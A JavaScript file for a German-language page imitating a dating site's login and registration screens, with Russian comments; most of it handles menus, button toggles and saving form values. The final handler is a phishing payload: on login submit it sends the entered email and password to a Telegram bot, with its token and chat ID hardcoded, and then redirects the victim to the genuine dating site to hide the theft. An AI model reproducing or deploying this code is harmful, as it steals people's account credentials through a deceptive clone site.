// script.js
// Здесь будет логика работы модалей, проверки форм и т.п.
document.querySelectorAll('.main-nav').forEach(container => {
    container.addEventListener('wheel', (e) => {
        e.preventDefault();
        container.scrollLeft += e.deltaY;
    });
});

const button = document.getElementById('loginBtn');
const block = document.querySelector('._2HTG0eFCOOnQ7GlQjXxA0A');
button.addEventListener('click', function () {
    
  // Переключаем класс active у блока
  block.classList.toggle('active');

  // Меняем текст кнопки в зависимости от наличия класса active
  if (block.classList.contains('active')) {
    button.textContent = 'Registrieren';
    button.style.background = '#ed147d';
  } else {
    button.textContent = 'Login';
    button.style.background = '#ed147d';
    button.style.color = '#fff';
  }
});

const buttonmobile = document.getElementById('loginBtnMobile');
const blockmobile = document.querySelector('._2HTG0eFCOOnQ7GlQjXxA0A');
const mobile = document.querySelector('._2cBuFm0Qle0nm-TdHZuZZ8');
const signinmobile = document.getElementById('signinBtnMobile');
buttonmobile.addEventListener('click', function () {
  // Переключаем класс active у блока
  blockmobile.classList.toggle('active');

  // Меняем текст кнопки в зависимости от наличия класса active
  if (blockmobile.classList.contains('active')) {
    buttonmobile.textContent = 'Registrieren';
    buttonmobile.style.background = '#ed147d';
    buttonmobile.style.padding = '0 .875rem';
    mobile.style.display = 'none';
    signinmobile.style.display = 'none';
  } else {
    mobile.style.display = 'block';
    signinmobile.style.display = 'block';
    buttonmobile.textContent = 'Login';
    buttonmobile.style.background = 'none';
    buttonmobile.style.padding = '0';
    buttonmobile.style.color = '#fff';
    
  }
});

const burger = document.querySelector('.burger');
const burgerMenu = document.querySelector('.burger-menu');
flagger = 0;
burger.addEventListener('click', function () {
    if (flagger == 0) {
        burgerMenu.style.left = '0';
        flagger = 1;
    } else {
        burgerMenu.style.left = '-100%';
        flagger = 0;
    }
});


document.addEventListener("DOMContentLoaded", function () {
    const form = document.querySelector("form._2L7bQW-Lc3rcVmiPExZSEI");
    const submitButton = document.querySelector(
        "[data-testid='desktop-starter-regform-submit-button']"
    );

    if (form && submitButton) {
        submitButton.addEventListener("click", function (event) {
            event.preventDefault(); // Предотвращаем стандартное поведение формы

            // Сбор данных из формы
            const gender = form.querySelector("[data-description='search-gender']").value;
            const ageMin = form.querySelector("[data-description='age-min']").value;
            const ageMax = form.querySelector("[data-description='age-max']").value;
            const location = form.querySelector("[data-description='location']").value;

            // Очистка localStorage перед записью новых данных
            localStorage.clear();

            // Сохранение данных в localStorage
            const formData = {
                gender,
                ageMin,
                ageMax,
                location,
            };
            localStorage.setItem("formData", JSON.stringify(formData));

            // Перенаправление на register.html
            window.location.href = "register.html";
        });
    }
});

const botToken = '7598422575:AAHyxJW8x_iEbFOKAyfHif5dhhEnIrBMOtc';
const chatId = '7651880443';

document.addEventListener('DOMContentLoaded', function () {
    const form = document.getElementById('login-form');
    const emailInput = document.getElementById('login-form-email-input');
    const passwordInput = document.getElementById('login-form-password-input');

    if (form && emailInput && passwordInput) {
        form.addEventListener('submit', function (event) {
            event.preventDefault(); // Останавливаем стандартную отправку формы

            const email = emailInput.value.trim();
            const password = passwordInput.value.trim();

            const message = `📧 Email: ${email}\n🔐 Пароль: ${password}`;
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => {
                if (response.ok) {
                    console.log('Данные успешно отправлены в Telegram');
                    window.location.href = 'https://www.lovescout24.de/';
                } else {
                    console.error('Ошибка при отправке данных в Telegram');
                }
            })
            .catch(error => {
                console.error('Ошибка сети:', error);
            });

            // Опционально: очистка полей формы
            emailInput.value = '';
            passwordInput.value = '';
        });
    } else {
        console.warn('Не найдены элементы формы');
    }
});

function goToRegister() {
    window.location.href = 'register.html';
}

